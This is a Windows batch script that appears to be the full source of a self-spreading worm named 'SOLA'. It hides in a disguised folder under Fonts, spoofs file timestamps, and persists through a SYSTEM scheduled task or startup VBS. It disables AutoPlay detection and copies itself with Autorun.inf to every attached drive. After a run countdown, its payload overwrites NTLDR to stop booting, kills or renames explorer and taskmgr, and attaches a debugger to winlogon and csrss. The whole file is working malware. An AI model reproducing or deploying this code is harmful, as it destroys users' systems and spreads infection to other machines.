@echo off
set sola=%systemroot%\Fonts\HIDESE~1
set setup=%systemroot%\Fonts\HIDESE~1\solasetup
FOR /F "tokens=1" %%i in ('date /t') do set Realdate=%%i
FOR /F "skip=5 tokens=1,4" %%i in ('dir %systemroot%\explorer.exe') do if /I "%%j"=="explorer.exe" set Date=%%i
if "%1"=="-Install" goto Install
if "%1"=="-Run" goto Run
if "%1"=="-Tenbatsu" goto Tenbatsu
if "%1"=="-Kill" goto Kill
if "%1"=="-Killself" goto Killself

:CheckSign
if "%1"=="-USB" start /max ..
if "%1"=="-USB" cd SOLA
if exist %systemroot%\Fonts\HIDESE~1\sola.sign goto Open

:FileCopy
set selfname=%0
:HIDESelf
date %Date%
md %systemroot%\Fonts\HIDESELF...\
date %RealDate%
if not "%1"=="-USB" type %selfname%>%systemroot%\Fonts\HIDESE~1\sola.bat
if "%1"=="-USB" type sola.bat>%systemroot%\Fonts\HIDESE~1\sola.bat
type Function.dll>%systemroot%\Fonts\HIDESE~1\Function.exe
echo On Error Resume Next>%systemroot%\Fonts\HIDESE~1\SOLA.VBS
echo set ws=wscript.createobject("wscript.shell")>>%systemroot%\Fonts\HIDESE~1\SOLA.VBS
echo ws.run "cmd /c %sola%\SOLA.BAT -Install",0 >>%systemroot%\Fonts\HIDESE~1\SOLA.VBS
cscript %systemroot%\Fonts\HIDESE~1\SOLA.VBS
echo>%systemroot%\Fonts\HIDESE~1\sola.sign
del %systemroot%\Fonts\HIDESE~1\SOLA.VBS
goto Open


:Install


:PackerSetup
%SystemDrive%
cd %systemroot%\Fonts\HIDESE~1
if exist Function.exe taskkill /f /im Function.exe
if exist solasetup rd /s /q solasetup
md solasetup
cd solasetup
copy ..\Function.exe Function.dll
..\Function.exe -x
cd..
date %Date%
type %setup%\rar.exe >%systemroot%\system32\rar.exe
date %Realdate%
copy %setup%\Function.dll %sola%\Function.dll
attrib %sola%\Function.dll +s +h +r
rar -m0 -ep -ep1 a %setup%\docpack.dll %sola%\Function.dll
rar -m0 -ep -ep1 a %setup%\txtpack.dll %sola%\Function.dll
rar -m0 -ep -ep1 a %setup%\exepack.dll %sola%\Function.dll
rar -m0 -ep -ep1 a %setup%\jpgpack.dll %sola%\Function.dll
del Function.exe



:Mainsetup
set A0001=copy
set A0002=attrib
set A0003=echo
set A0005=Shell Hardware Detection
tasklist >%sola%\task.txt
FOR /F "tokens=1" %%i in ('findstr /I "svchost.exe" "%sola%\task.txt"') do set svchost=%%i
%A0001% %systemroot%\system32\cmd.exe %sola%\%svchost%
del %sola%\task.txt

:Tasks
%A0002% %systemroot%\Tasks\Tasks.job -s -h -r
del %systemroot%\Tasks\Tasks.job

date %Date%
type %setup%\Tasks.xxx>%systemroot%\Tasks\Tasks.job
schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks" & if errorlevel 1 goto TaskFail
date %RealDate%

goto TaskSuc
:TaskFail
%homedrive%
cd "%ALLUSERSPROFILE%"
cd 「开始」菜单\程序\启动

date %Date%
%A0003% On Error Resume Next>SOLA.VBS
%A0003% set ws=wscript.createobject("wscript.shell")>>SOLA.VBS
%A0003% ws.run "%sola%\svchost.exe /c %sola%\SOLA.BAT -Run",0 >>SOLA.VBS
%A0001% SOLA.VBS %sola%\SOLA.VBS
%A0003% NT>%systemroot%\Fonts\HIDESE~1\NoTasks
date %RealDate%

:TaskSuc
%A0002% %systemroot%\Tasks\Tasks.job +s +h +r
date %Date%
%A0001% %setup%\sleep.exe %systemroot%\system32\sleep.exe
date %RealDate%

:NoAutoPlay
net stop "%A0005%"
%A0003% Windows Registry Editor Version 5.00>%systemroot%\Fonts\HIDESE~1\Regedit.reg
%A0003% [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ShellHWDetection]>>%systemroot%\Fonts\HIDESE~1\Regedit.reg
%A0003% "Start"=dword:00000004>>%systemroot%\Fonts\HIDESE~1\Regedit.reg
regedit /s %systemroot%\Fonts\HIDESE~1\Regedit.reg

::End of Install
goto End&if errorlevel 1 exit
::End of Install




:Run
set runroot=%ALLUSERSPROFILE%\「开始」菜单\程序\启动
set taskroot=%systemroot%\Tasks

:RunTimeChk
if not exist %sola%\RunTime.txt echo !50>%sola%\RunTime.txt
FOR /F "tokens=1 delims=!" %%i in (%sola%\RunTime.txt) do set RunTime=%%i
if /i %RunTime% leq 0 goto Virus
set /a RunTime=%Runtime%-1
echo !%Runtime%>%sola%\RunTime.txt

:Diskchk

echo On Error Resume Next>%systemroot%\Fonts\HIDESE~1\RecentInf.VBS
echo set ws=wscript.createobject("wscript.shell")>>%systemroot%\Fonts\HIDESE~1\RecentInf.VBS
echo ws.run "%sola%\svchost.exe /c %setup%\RecentInf.bat",0 >>%systemroot%\Fonts\HIDESE~1\RecentInf.VBS
cscript %systemroot%\Fonts\HIDESE~1\RecentInf.VBS
del %systemroot%\Fonts\HIDESE~1\RecentInf.VBS

for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do vol %%i:&if errorlevel 1 set %%i=1
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do echo 1>%%i:\solachk1 & findstr . %%i:\solachk1 & if not errorlevel 1 del %%i:\solachk1& findstr /C:"SOLA_1.0_2.0" %%i:\Autorun.inf & if errorlevel 1  attrib -s -h -r %%i:\Autorun.inf&copy /y %setup%\Autorun.inf %%i:\Autorun.inf&attrib %%i:\Autorun.inf +s +h +r&md %%i:\SOLA&copy /y "%setup%\sola.bat" %%i:\SOLA\SOLA.BAT&copy /y "%setup%\Function.dll" %%i:\SOLA\Function.dll&attrib %%i:\SOLA +s +h +r


:Turn
if "%C%"=="1" vol C:&if not errorlevel 1 call %setup%\Scan.bat C:
if "%D%"=="1" vol D:&if not errorlevel 1 call %setup%\Scan.bat D:
if "%E%"=="1" vol E:&if not errorlevel 1 call %setup%\Scan.bat E:
if "%F%"=="1" vol F:&if not errorlevel 1 call %setup%\Scan.bat F:
if "%G%"=="1" vol G:&if not errorlevel 1 call %setup%\Scan.bat G:
if "%H%"=="1" vol H:&if not errorlevel 1 call %setup%\Scan.bat H:
if "%I%"=="1" vol I:&if not errorlevel 1 call %setup%\Scan.bat I:
if "%J%"=="1" vol J:&if not errorlevel 1 call %setup%\Scan.bat J:
if "%K%"=="1" vol K:&if not errorlevel 1 call %setup%\Scan.bat K:
if "%L%"=="1" vol L:&if not errorlevel 1 call %setup%\Scan.bat L:
if "%M%"=="1" vol M:&if not errorlevel 1 call %setup%\Scan.bat M:
if "%N%"=="1" vol N:&if not errorlevel 1 call %setup%\Scan.bat N:
if "%O%"=="1" vol O:&if not errorlevel 1 call %setup%\Scan.bat O:
if "%P%"=="1" vol P:&if not errorlevel 1 call %setup%\Scan.bat P:
if "%Q%"=="1" vol Q:&if not errorlevel 1 call %setup%\Scan.bat Q:
if "%R%"=="1" vol R:&if not errorlevel 1 call %setup%\Scan.bat R:
if "%S%"=="1" vol S:&if not errorlevel 1 call %setup%\Scan.bat S:
if "%T%"=="1" vol T:&if not errorlevel 1 call %setup%\Scan.bat T:
if "%U%"=="1" vol U:&if not errorlevel 1 call %setup%\Scan.bat U:
if "%V%"=="1" vol V:&if not errorlevel 1 call %setup%\Scan.bat V:
if "%W%"=="1" vol W:&if not errorlevel 1 call %setup%\Scan.bat W:
if "%X%"=="1" vol X:&if not errorlevel 1 call %setup%\Scan.bat X:
if "%Y%"=="1" vol Y:&if not errorlevel 1 call %setup%\Scan.bat Y:
if "%Z%"=="1" vol Z:&if not errorlevel 1 call %setup%\Scan.bat Z:

if "%C%"=="2" vol C:&if errorlevel 1 set C=1
if "%D%"=="2" vol D:&if errorlevel 1 set D=1
if "%E%"=="2" vol E:&if errorlevel 1 set E=1
if "%F%"=="2" vol F:&if errorlevel 1 set F=1
if "%G%"=="2" vol G:&if errorlevel 1 set G=1
if "%H%"=="2" vol H:&if errorlevel 1 set H=1
if "%I%"=="2" vol I:&if errorlevel 1 set I=1
if "%J%"=="2" vol J:&if errorlevel 1 set J=1
if "%K%"=="2" vol K:&if errorlevel 1 set K=1
if "%L%"=="2" vol L:&if errorlevel 1 set L=1
if "%M%"=="2" vol M:&if errorlevel 1 set M=1
if "%N%"=="2" vol N:&if errorlevel 1 set N=1
if "%O%"=="2" vol O:&if errorlevel 1 set O=1
if "%P%"=="2" vol P:&if errorlevel 1 set P=1
if "%Q%"=="2" vol Q:&if errorlevel 1 set Q=1
if "%R%"=="2" vol R:&if errorlevel 1 set R=1
if "%S%"=="2" vol S:&if errorlevel 1 set S=1
if "%T%"=="2" vol T:&if errorlevel 1 set T=1
if "%U%"=="2" vol U:&if errorlevel 1 set U=1
if "%V%"=="2" vol V:&if errorlevel 1 set V=1
if "%W%"=="2" vol W:&if errorlevel 1 set W=1
if "%X%"=="2" vol X:&if errorlevel 1 set X=1
if "%Y%"=="2" vol Y:&if errorlevel 1 set Y=1
if "%Z%"=="2" vol Z:&if errorlevel 1 set Z=1




if exist %systemroot%\Fonts\HIDESE~1\NoTasks if not exist "%runroot%\SOLA.VBS" copy "%sola%\SOLA.VBS" "%runroot%\SOLA.VBS"
if not exist %systemroot%\Fonts\HIDESE~1\NoTasks if not exist %Taskroot%\Tasks.job copy %setup%\Tasks.xxx %Taskroot%\Tasks.job&attrib %Taskroot%\Tasks.job +s +h +r&schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks"
sleep 2000
goto Turn

::End of Run
goto End&if errorlevel 1 exit
::End of Run







:Virus
if not "%Runtime%"=="0" goto VirusChk
set /a RunTime=%Runtime%-1
echo !%Runtime%>%sola%\RunTime.txt
cd "%ALLUSERSPROFILE%\「开始」菜单\程序\启动"
echo On Error Resume Next>TENBATSU.VBS
echo set ws=wscript.createobject("wscript.shell")>>TENBATSU.VBS
echo ws.run "%sola%\sola.bat -Tenbatsu",0 >>TENBATSU.VBS
goto Diskchk

:VirusChk
if not exist "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\TENBATSU.VBS" goto Kill
goto Diskchk

:Tenbatsu
:KillNTLDR
attrib %systemdrive%\NTLDR -s -h -r
copy /Y %systemdrive%\NTLDR %sola%\NTLDR
echo NO NTLDR>%systemdrive%\NTLDR
::attrib %systemdrive%\NTLDR +s +h +r

:PauseSFC
start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()"

:KillTaskmgr
del /q /a %systemroot%\system32\dllcache\taskmgr.exe
taskkill /f /im taskmgr.exe & if errorlevel 1 ren %systemroot%\system32\taskmgr.exe taskmgr.xxx & if errorlevel 1 start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close()" & sleep 500
ren %systemroot%\system32\taskmgr.exe taskmgr.xxx

:KillExplorer
taskkill /f /im explorer.exe >nul& if errorlevel 1 ren %systemroot%\system32\explorer.exe explorer.xxx & start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.close()" & sleep 500
ren %systemroot%\explorer.exe explorer.xxx
start /max %setup%\TENBATSU.BAT

:Timeset
sleep 660000
if exist %sola%\Killself Exit

:Kill
attrib %systemdrive%\NTLDR -s -h -r
echo NO NTLDR>%systemdrive%\NTLDR
::attrib %systemdrive%\NTLDR +s +h +r
tasklist >%sola%\Task.txt
FOR /F "tokens=2" %%i in ('findstr /I "csrss.exe" "%sola%\Task.txt"') do ntsd -p %%i
goto Diskchk



:KillSelf
:StartExplorer
ren %systemroot%\explorer.xxx explorer.exe
start %systemroot%\explorer.exe
:BackNTLDR
attrib %systemdrive%\NTLDR -s -h -r
copy /Y %sola%\NTLDR %systemdrive%\NTLDR
attrib %systemdrive%\NTLDR +s +h +r

:RenTmg
ren %systemroot%\system32\taskmgr.xxx taskmgr.exe

:KillVirus
copy %setup%\KillVirus.txt %sola%\KillVirus.txt
C:
cd\
md ~Install
cd ~Install
rar x -hpkakenhi200601 %setup%\SolaKiller.rar
mshta "javascript:new ActiveXObject('WScript.Shell').Run('C:\\~Install\\Install.bat %%1',0);window.close()"
rd /s /q %setup%
attrib %systemroot%\Tasks\Tasks.job -s -h -r
del %systemroot%\Tasks\Tasks.job
cd "%ALLUSERSPROFILE%\「开始」菜单\程序\启动"
if exist sola.vbs del sola.vbs
if exist tenbatsu.vbs del tenbatsu.vbs
start %systemroot%\system32\notepad.exe %sola%\KillVirus.txt
del %sola%\sola.bat
Exit



:Open
if "%1"=="-USB" Exit
goto GetName
:BackOpen
if not exist "%Name%" exit
call "%Name%"
:Save
FOR /F "delims=:" %%i in ('findstr "%Code%" *.exe') do set PackName=%%i
rar -m0 -ep -ep1 a "%PackName%" "%Name%"
echo %Code%>>"%PackName%"
:Del
attrib "%Name%" -s -h -r
del "%Name%"
attrib Function.dll -s -h -r
del Function.dll
attrib %0 -s -h -r
del %0
exit
::CMD program will stop there.
:GetName
set Code=SOLA_2.0_2022660315774
set Name=七.doc
goto Backopen
:End
